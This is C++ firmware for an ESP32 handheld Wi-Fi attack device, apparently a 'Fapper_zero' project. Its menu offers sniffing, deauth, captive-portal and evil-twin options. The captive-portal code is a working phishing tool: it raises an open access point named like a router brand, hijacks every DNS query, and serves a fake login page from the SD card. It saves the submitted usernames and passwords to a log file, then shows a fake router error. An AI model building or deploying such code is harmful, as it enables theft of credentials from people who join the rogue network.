#include "wifi_menu.h"
#include "ui.h"
#include "global_flags.h"
#include "pin_config.h"
#include <vector>
#include <FS.h>
#include <SPIFFS.h>
#include <SPI.h>
#include <SD_MMC.h>
#include "Fapper_zero.h"

LV_IMG_DECLARE(fish);
LV_IMG_DECLARE(fishing);
lv_obj_t *fcc;

/*====================================================
 * VARIAVEIS CAPTIVE PORTAL 
 ====================================================*/

#define LOGFILE "/captive_portals/logs/logs.txt"
void captive_setup();
void handleRoot();
const byte DNS_PORT = 53;
IPAddress apIP(200, 200, 200, 1);
IPAddress netMsk(255, 255, 255, 0);
DNSServer dnsServer;
WebServer server(80);

using namespace std;
// Ponto de acesso
String ssid="Wi-Fi";
String erroPage = "";
String htmlContent;
String captiveHtml;  


// Strings de buffer
String webString="";
String serialString="";
bool lCatch = false;

void captive_setup();
void handleRoot();
void captive_function(const String& htmlContent);


/*==================================================
 * VARIAVEIS WIFI
 ===================================================*/
 /********************* Security handled here **********************
  ****** Note: these are the same return values as defaults ********/
  uint32_t onPassKeyRequest() {
    Serial.println("Client Passkey Request");
    /** return the passkey to send to the server */
    return 123456;
  };
typedef struct {
  lv_obj_t *(*obj_create)(lv_obj_t *parent);
  lv_align_t align;
  lv_coord_t x_ofs;
  lv_coord_t y_ofs;
  const char *text;
} textarea_config_t;
  bool onConfirmPIN(uint32_t pass_key) {
    Serial.print("The passkey YES/NO number: ");
    Serial.println(pass_key);
    /** Return false if passkeys don't match. */
    return true;
  };


static struct {
  lv_obj_t *dd_ssid;
  lv_obj_t *kb;
  lv_obj_t *msg;
  lv_timer_t *timer;
  String ssid_list;

} wireless_param;



LV_FONT_DECLARE(alibaba_font);

static lv_obj_t *create_obj_with_label(lv_obj_t *cont, textarea_config_t *u);
static lv_obj_t *create_btn_on_label(lv_obj_t *cont,const char *text);

void app_wireless_load();
static lv_obj_t *create_obj_with_label(lv_obj_t *container_obj, textarea_config_t *u);
static lv_obj_t *create_btn_on_label(lv_obj_t *container_obj,const char *text);
static void get_wifi_ssid_event_cb(lv_event_t *e);
static void connect_wifi_event_cb(lv_event_t *e);
static void ta_event_cb(lv_event_t *e);;
/*====================================================
 * VARIAVEIS DEAUTH
 ====================================================*/
static void deauth_handler(lv_event_t * e);
static void deauth_change_focus(lv_event_t * e);
void lv_deauth_select(void);
static void deauther_config(lv_event_t *e);
static void draw_event_cb(lv_event_t * e);
static lv_group_t* group_container_obj = nullptr;

/*====================================================
 * VARIAVEIS TELA
 ====================================================*/
 

static lv_obj_t *container_obj= nullptr;
static lv_obj_t *parent_obj= nullptr;
static lv_obj_t * dd;
static void captive_config(lv_event_t *e);
static void wifi_config(lv_event_t *e);
static void captive_init(lv_event_t *e);

static void event_handler(lv_event_t *e)
{
        if (e == nullptr) {
            return;
        }
    lv_event_code_t code = lv_event_get_code(e);
    lv_obj_t * obj = lv_event_get_target(e);
    if(code == LV_EVENT_VALUE_CHANGED) {
        char buf[32];
        lv_dropdown_get_selected_str(obj, buf, sizeof(buf));
        LV_LOG_USER("Option: %s", buf);
    }
}


void lv_wifi_tabview(lv_obj_t *parent)
{

     parent_obj = parent;

    lv_obj_t *container = lv_obj_create(parent);
    lv_obj_set_size(container, LV_HOR_RES, LV_VER_RES);
    lv_obj_set_flex_flow(container, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_flex_align(container, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_START);
    lv_obj_t *list1 = lv_list_create(container);
    lv_obj_set_size(list1, 105, 140);
    lv_obj_set_align(list1, LV_ALIGN_TOP_LEFT);

    lv_obj_t *btn = lv_list_add_btn(list1, LV_SYMBOL_WIFI, "Sniffer");
    lv_obj_add_event_cb(btn, wifi_config, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *btn2 = lv_list_add_btn(list1, LV_SYMBOL_WARNING, "Deauther");
    lv_obj_add_event_cb(btn2, deauther_config, LV_EVENT_CLICKED, NULL);
    

    lv_obj_t * btn3= lv_list_add_btn(list1, LV_SYMBOL_EYE_OPEN, "Captive portal");
    lv_obj_add_event_cb(btn3, captive_config, LV_EVENT_CLICKED, NULL);
   

    lv_obj_t *btn4 = lv_list_add_btn(list1, LV_SYMBOL_SHUFFLE, "Evil Twin");
    lv_obj_add_event_cb(btn4, event_handler, LV_EVENT_CLICKED, NULL);
  
}


void runWifiWindow(lv_obj_t *parent)
{
  lv_wifi_tabview(parent);

}

/*=====================================
 * FUNCOES DEAUTHER
 ======================================*/

static void draw_event_cb(lv_event_t * e)
{
    lv_obj_t * obj = lv_event_get_target(e);
    lv_obj_draw_part_dsc_t * dsc = lv_event_get_draw_part_dsc(e);
    /*If the cells are drawn...*/
    if(dsc->part == LV_PART_ITEMS) {
        bool chk = lv_table_has_cell_ctrl(obj, dsc->id, 0, LV_TABLE_CELL_CTRL_CUSTOM_1);

        lv_draw_rect_dsc_t rect_dsc;
        lv_draw_rect_dsc_init(&rect_dsc);
        rect_dsc.bg_color = chk ? lv_theme_get_color_primary(obj) : lv_palette_lighten(LV_PALETTE_GREY, 2);
        rect_dsc.radius = LV_RADIUS_CIRCLE;

        lv_area_t sw_area;
        sw_area.x1 = dsc->draw_area->x2 - 50;
        sw_area.x2 = sw_area.x1 + 40;
        sw_area.y1 = dsc->draw_area->y1 + lv_area_get_height(dsc->draw_area) / 2 - 10;
        sw_area.y2 = sw_area.y1 + 20;
        lv_draw_rect(dsc->draw_ctx, &rect_dsc, &sw_area);

        rect_dsc.bg_color = lv_color_white();
        if(chk) {
            sw_area.x2 -= 2;
            sw_area.x1 = sw_area.x2 - 16;
        }
        else {
            sw_area.x1 += 2;
            sw_area.x2 = sw_area.x1 + 16;
        }
        sw_area.y1 += 2;
        sw_area.y2 -= 2;
        lv_draw_rect(dsc->draw_ctx, &rect_dsc, &sw_area);
    }
}


static void deauther_config(lv_event_t *e)
{


   lv_deauth_select();
   
}

 
 static void deauth_handler(lv_event_t * e)
{
    lv_obj_t * obj = lv_event_get_target(e);
    uint16_t col;
    uint16_t row;
    lv_table_get_selected_cell(obj, &row, &col);
    bool chk = lv_table_has_cell_ctrl(obj, row, 0, LV_TABLE_CELL_CTRL_CUSTOM_1);
    if(chk) lv_table_clear_cell_ctrl(obj, row, 0, LV_TABLE_CELL_CTRL_CUSTOM_1);
    else lv_table_add_cell_ctrl(obj, row, 0, LV_TABLE_CELL_CTRL_CUSTOM_1);
}

static void deauth_change_focus(lv_event_t * e)
{
   

}

void lv_deauth_select(void)
  {
    lv_mem_monitor_t mon1;
    lv_mem_monitor(&mon1);

    uint32_t t = lv_tick_get();
    group_container_obj = lv_group_create();

    container_obj=lv_obj_create(parent_obj);
    lv_obj_set_size(container_obj,195,100);
    lv_obj_align(container_obj,  LV_ALIGN_TOP_MID, 60, 15);  

    lv_obj_t *container_obj2=lv_obj_create(parent_obj);
    lv_obj_set_size(container_obj2,195,35);
    lv_obj_align(container_obj2,  LV_ALIGN_TOP_MID, 60, 120); 
    lv_obj_remove_style(container_obj2, NULL, LV_PART_SCROLLBAR | LV_STATE_ANY);
    lv_obj_set_flex_flow(container_obj, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(container_obj, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER);
    
    lv_obj_t * table = lv_table_create(container_obj);

    /*Set a smaller height to the table. It'll make it scrollable*/
    lv_obj_set_size(table, LV_SIZE_CONTENT, 95);
    lv_table_set_col_width(table, 0, 190);
    lv_table_set_col_cnt(table, 1);

    /*Don't make the cell pressed, we will draw something different in the event*/
    lv_obj_remove_style(table, NULL, LV_PART_ITEMS | LV_STATE_PRESSED);

    uint32_t i;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    int n = WiFi.scanNetworks();
    wireless_param.ssid_list = "";
    for (int i = 0; i < n; i++)
    {
       lv_table_set_cell_value_fmt(table, i, 0, WiFi.SSID(i).c_str(), i + 1);
    }

    

    /*Add an event callback to to apply some custom drawing*/
    lv_obj_align(table, LV_ALIGN_CENTER, 0, -20);
    lv_obj_add_event_cb(table, draw_event_cb, LV_EVENT_DRAW_PART_END, NULL);
    lv_obj_add_event_cb(table, deauth_handler,LV_EVENT_SHORT_CLICKED, NULL);
    lv_obj_add_event_cb(table, deauth_change_focus, LV_EVENT_SCROLL_END , NULL);

    lv_mem_monitor_t mon2;
    lv_mem_monitor(&mon2);

    uint32_t mem_used = mon1.free_size - mon2.free_size;

    uint32_t elaps = lv_tick_elaps(t);

 
    lv_obj_t * btn1 = lv_btn_create(container_obj2);
    lv_obj_add_event_cb(btn1,event_handler,LV_EVENT_CLICKED, NULL);
    lv_obj_align(btn1,  LV_ALIGN_TOP_MID, 0, -10);
    lv_obj_set_size(btn1, 100, 20);
    lv_obj_t *label = lv_label_create(btn1);
    lv_label_set_text(label, "DEAUTHER");
    lv_obj_center(label);


}

/*=====================================
 * FUNCOES WIFI
 ======================================*/

static void wifi_config(lv_event_t *e)
{
   
    app_wireless_load();
  
}

 
void app_wireless_load() {


  container_obj=lv_obj_create(parent_obj);
  lv_obj_set_size(container_obj,195,140);
  lv_obj_align(container_obj,  LV_ALIGN_TOP_MID, 60, 15);  
  
  textarea_config_t t1 = {
      .obj_create = lv_dropdown_create,
      .align = LV_ALIGN_TOP_LEFT,
      .x_ofs = 14,
      .y_ofs = 15,
      .text = "SSID:",
  };
  wireless_param.dd_ssid = create_obj_with_label(container_obj, &t1);
  lv_dropdown_set_options(wireless_param.dd_ssid, wireless_param.ssid_list.c_str());
  lv_dropdown_set_dir(wireless_param.dd_ssid, LV_DIR_HOR);
  lv_obj_t *btn = create_btn_on_label(container_obj, LV_SYMBOL_REFRESH);
  lv_obj_align_to(btn, wireless_param.dd_ssid, LV_ALIGN_OUT_RIGHT_MID, 10, 0);
  lv_obj_add_event_cb(btn, get_wifi_ssid_event_cb, LV_EVENT_CLICKED, wireless_param.dd_ssid);

  textarea_config_t t2 = {
      .obj_create = lv_textarea_create,
      .align = LV_ALIGN_TOP_LEFT,
      .x_ofs = 0,
      .y_ofs = 55,
      .text = "PSWD: ",
  };
  lv_obj_t *ta2 = create_obj_with_label(container_obj, &t2);
  lv_textarea_set_one_line(ta2, true);
  lv_textarea_set_password_mode(ta2, true);

  btn = create_btn_on_label(container_obj, LV_SYMBOL_OK);
  lv_obj_align_to(btn, ta2, LV_ALIGN_OUT_RIGHT_MID, 10, 0);
  lv_obj_add_event_cb(btn, connect_wifi_event_cb, LV_EVENT_CLICKED, ta2);

 

  wireless_param.kb = lv_keyboard_create(parent_obj);
  lv_obj_add_flag(wireless_param.kb, LV_OBJ_FLAG_HIDDEN);

  lv_obj_add_event_cb(ta2, ta_event_cb, LV_EVENT_ALL, wireless_param.kb);


}

static lv_obj_t *create_obj_with_label(lv_obj_t *container_obj, textarea_config_t *u) {
  lv_obj_t *label = lv_label_create(container_obj);
  lv_obj_align(label, u->align, u->x_ofs, u->y_ofs);
  lv_label_set_text(label, u->text);

  lv_obj_t *obj = u->obj_create(container_obj);
  lv_obj_set_size(obj, 65, 35);
  lv_obj_align_to(obj, label, LV_ALIGN_OUT_RIGHT_MID, 5, 0);
  lv_obj_set_style_outline_color(obj, lv_color_white(), LV_STATE_FOCUS_KEY);

  return obj;
}

static lv_obj_t *create_btn_on_label(lv_obj_t *container_obj,const char *text) {

  lv_obj_t *btn = lv_btn_create(container_obj);
  lv_obj_set_size(btn, 40, 30);
  lv_obj_set_style_bg_color(btn, lv_palette_main(LV_PALETTE_GREY), 0);
  lv_obj_set_style_outline_color(btn, lv_color_white(), LV_STATE_FOCUS_KEY);

  lv_obj_t *label = lv_label_create(btn);
  lv_obj_center(label);
  lv_label_set_text(label, text);

  return btn;
}

static void get_wifi_ssid_event_cb(lv_event_t *e) {
  lv_obj_t *dd = (lv_obj_t *)lv_event_get_user_data(e);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  int n = WiFi.scanNetworks();
  wireless_param.ssid_list = "";
  for (int i = 0; i < n; i++) {
    wireless_param.ssid_list += WiFi.SSID(i);
    wireless_param.ssid_list += "\n";
  }
  lv_dropdown_set_options(dd, wireless_param.ssid_list.c_str());
}

static void connect_wifi_event_cb(lv_event_t *e) {

  lv_obj_t *password_obj = (lv_obj_t *)lv_event_get_user_data(e);
  lv_obj_t *dd = wireless_param.dd_ssid;
  char ssid[20];
  lv_dropdown_get_selected_str(dd, ssid, 20);
  const char *password = lv_textarea_get_text(password_obj);
  WiFi.disconnect();
  WiFi.begin(ssid, password);
  while (WiFi.status() != WL_CONNECTED) {
    delay(1000);
    
  }
 if (WiFi.status() == WL_CONNECTED) 
 {
      wifi_sniffer_init();
    }
}

static void ta_event_cb(lv_event_t *e) {
  lv_indev_t *indev = lv_indev_get_act();
  if (indev == NULL)
    return;
  lv_indev_type_t indev_type = lv_indev_get_type(indev);

  lv_event_code_t code = lv_event_get_code(e);
  lv_obj_t *ta = lv_event_get_target(e);
  lv_obj_t *kb = (lv_obj_t *)lv_event_get_user_data(e);

  if (code == LV_EVENT_CLICKED && indev_type == LV_INDEV_TYPE_ENCODER) {
    lv_keyboard_set_textarea(kb, ta);
    lv_obj_clear_flag(kb, LV_OBJ_FLAG_HIDDEN);
    lv_group_focus_obj(kb);
    lv_group_set_editing((lv_group_t *)lv_obj_get_group(kb), true);
    lv_obj_align(kb, LV_ALIGN_BOTTOM_MID, 0, 0);
  }

  if (code == LV_EVENT_READY || code == LV_EVENT_CANCEL) {
    lv_obj_add_flag(kb, LV_OBJ_FLAG_HIDDEN);
    lv_group_set_editing((lv_group_t *)lv_obj_get_group(kb), false);
    lv_group_focus_obj(ta);
  }
}


/*=====================================
 * FUNCOES CAPTIVE PORTAL
 ======================================*/

static void captive_config(lv_event_t *e)
{
  pinMode(PIN_SD_CS, OUTPUT);
  digitalWrite(PIN_SD_CS, 1);
  SD_MMC.setPins(PIN_SD_SCK, PIN_SD_MOSI, PIN_SD_MISO);
  if (!SD_MMC.begin("/sdcard", true)) {
     
      return;
   }
  uint8_t cardType = SD_MMC.cardType();

  if (cardType == CARD_NONE) {
       return;
  }
  if (cardType == CARD_MMC) {
  } else if (cardType == CARD_SD) {  
  } else if (cardType == CARD_SDHC) {   
  }

  File root = SD_MMC.open("/captive_portals/pages");
  if (!root) {
    //return;
  }
String  pagesFiles = "";
String fileName ="";
  File file = root.openNextFile();
  while (file) {
  fileName = String(file.name()) ;
   if (fileName.endsWith(".html")) {
     pagesFiles+= fileName.substring(0, fileName.length() - 5)+ "\n";
  }
    
   // String(file.name()) ;
    file = root.openNextFile();
  }
    container_obj=lv_obj_create(parent_obj);
    lv_obj_set_size(container_obj,195,140);
    lv_obj_align(container_obj,  LV_ALIGN_TOP_MID, 60, 15);
    dd = lv_dropdown_create(container_obj);
    lv_dropdown_set_options(dd,pagesFiles.c_str() );

    lv_obj_align(dd, LV_ALIGN_TOP_MID, 0, 10);
    lv_obj_add_event_cb(dd, event_handler, LV_EVENT_ALL, NULL);
    
    lv_obj_t * btn1 = lv_btn_create(container_obj);
    lv_obj_add_event_cb(btn1, captive_init,LV_EVENT_CLICKED, NULL);
    lv_obj_align(btn1,  LV_ALIGN_TOP_MID, 0, 60);

    lv_obj_t *label = lv_label_create(btn1);
    lv_label_set_text(label, "Start");
    lv_obj_center(label);

    
}

static void captive_init(lv_event_t *e)
{
    String htmlFile;
    char buffer[32];        
    
    lv_dropdown_get_selected_str(dd, buffer, sizeof(buffer));
    lv_obj_clean(parent_obj);
    htmlFile = String(buffer)+".html";
    captive_function(htmlFile);
   

  }

void captive_setup(){

  // Iniciar comunicação serial
  
  pinMode(PIN_SD_CS, OUTPUT);
 
  digitalWrite(PIN_SD_CS, 1);
  SD_MMC.setPins(PIN_SD_SCK, PIN_SD_MOSI, PIN_SD_MISO);
  
  if (!SD_MMC.begin("/sdcard", true)) {
      
      return;
   }
  uint8_t cardType = SD_MMC.cardType();
  if (cardType == CARD_NONE) {    
       return;
  }
  
  if (cardType == CARD_MMC) {
  } else if (cardType == CARD_SD) { 
  } else if (cardType == CARD_SDHC) {
      
  }

 
  WiFi.mode(WIFI_AP);
  delay(2000);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(ssid.c_str());
  delay(500);


  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", apIP);


  // Verifique o nome do domínio e atualize a página
  server.on("/", handleRoot);
  server.on("/generate_204", handleRoot);  // Portal cativo Android. Talvez não seja necessário. Pode ser manipulado pelo manipulador notFound.
  server.on("/fwlink", handleRoot); // Portal cativo da Microsoft. Talvez não seja necessário. Pode ser manipulado pelo manipulador notFound.
  server.onNotFound(handleRoot);

  // Valide e salve as combinações USUARIO / SENHA
    server.on("/validate", []() {
    // armazenar credenciais colhidas
    String url = server.arg("url");
    String user = server.arg("user");
    String pass = server.arg("pass");
   
    // Enviando dados para Serial (DEBUG

    // Anexar dados ao arquivo de log
    File f = SD_MMC.open(LOGFILE, FILE_APPEND);
    if (f) {
      f.println(user);
      f.println(pass);
      f.close();
      lCatch = true;
    } else {
      
    }
    File error = SD_MMC.open("/captive_portals/router/tplink.html");
    if (!error) {
        
        return;
    }else if (error.available()) {
        erroPage = error.readString();
       
        error.close();
     
    }
    // Envie uma resposta de erro ao usuário após a coleta de credencial
    server.send(500, "text/html", erroPage);

    // Reinicializar strings de buffer
    serialString="";
    webString="";
    
  });



  // Inicie o servidor da Web
  server.begin(); 
  
}
void handleRoot() {

  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");
  if (lCatch) {
    lv_obj_del(fcc);
    lv_obj_clean(lv_scr_act());
    fcc = lv_img_create(lv_scr_act());
    lv_img_set_src(fcc, &fishing);
    lv_task_handler();
    LV_DELAY(2000);
    lv_obj_del(fcc);
    lv_obj_clean(lv_scr_act());
    fcc = lv_img_create(lv_scr_act());
    lv_img_set_src(fcc, &fish);
    lv_task_handler();
    lCatch = false;
  }
  File f = SD_MMC.open(captiveHtml); 
  if (!f) {
   
    return;
  } else if (f.available()) {
    htmlContent = f.readString();
    
    f.close();
  }
  
  server.send(200, "text/html", htmlContent);
}


  
void captive_function(const String& htmlContent) {
 
    captiveHtml = "/captive_portals/pages/" +htmlContent; 
    ssid = htmlContent.substring(0, htmlContent.length() - 5)+"-WIFI";
    ssid.toUpperCase();
    lv_obj_clean(lv_scr_act());
    fcc = lv_img_create(lv_scr_act());
    lv_img_set_src(fcc, &fish);
    lv_task_handler();  
    captive_setup();

}


app_t wifi_ui = {
    .setup_func_cb = runWifiWindow,
    .exit_func_cb = nullptr,
    .user_data = nullptr
};
